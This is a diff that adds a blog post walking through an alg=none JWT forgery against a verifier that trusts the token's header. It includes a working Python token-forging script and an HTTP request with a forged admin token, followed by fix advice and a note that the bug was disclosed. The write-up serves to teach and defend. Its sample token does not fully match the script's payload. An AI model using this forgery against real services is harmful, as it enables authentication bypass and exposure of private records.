@@ -1,0 +1,78 @@
+---
+title: 'alg=none: forging admin tokens against an unguarded verifier'
+date: 2026-03-14
+excerpt: A single missing allow-list turned a read-only API into full admin access. Here's the full chain — from a grep hit to 14 admin records returned.
+cover: /images/blog/cover-jwt.svg
+---
+
+Most authentication bugs aren't exotic. This one started with a single `grep`
+across the target's source and ended with the server happily handing back every
+admin record it had — because it trusted a value the attacker fully controls.
+
+## Finding the verifier
+
+The first pass was boring on purpose: find every place the codebase touches a
+JSON Web Token. Two files lit up.
+
+```bash
+$ grep -rnE 'jwt\.verify|decodeJwt' src/
+src/middleware/auth.ts:47:  const claims = jwt.verify(token, key, { algorithms });
+src/lib/token.ts:22:  const { alg } = decodeProtectedHeader(token);
+```
+
+The interesting part is line 47: the `algorithms` array isn't a constant. It's
+derived, a few lines up, from the token's *own* header.
+
+## Why this is exploitable
+
+A JWT's header declares which algorithm signed it. If the verifier reads that
+header and then trusts it without an allow-list, an attacker can simply declare
+`alg: none` — the "unsecured JWT" mode — and ship a token with **no signature at
+all**.
+
+> The fix is one line: pass a fixed `algorithms: ['RS256']`. The bug is also one
+> line: passing whatever the request asked for.
+
+![The forged header and the server's response](/images/blog/cover-jwt.svg "alg=none in, 200 OK out")
+
+### Building the token
+
+With no signature required, the "exploit" is just string concatenation:
+
+```python
+import base64, json
+
+def b64(obj):
+    raw = json.dumps(obj, separators=(",", ":")).encode()
+    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
+
+header  = {"alg": "none", "typ": "JWT"}
+payload = {"sub": "root", "role": "admin"}
+
+# note the trailing dot: an empty signature segment
+token = f"{b64(header)}.{b64(payload)}."
+print(token)
+```
+
+### Proving impact
+
+A read-only endpoint was enough to confirm the privilege jump:
+
+```http
+POST /v1/admin/users HTTP/1.1
+Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJyb290In0.
+
+HTTP/1.1 200 OK
+{ "count": 14, "users": [ ... ] }
+```
+
+Fourteen admin records, returned to a token nobody signed.
+
+## Takeaways
+
+- **Never** let the request choose the verification algorithm.
+- Pin algorithms to an explicit allow-list, and reject `none` everywhere.
+- One `grep` and one disciplined read of the verifier is worth more than a week
+  of automated scanning.
+
+The disclosure went out the same afternoon; the patch shipped within 48 hours.
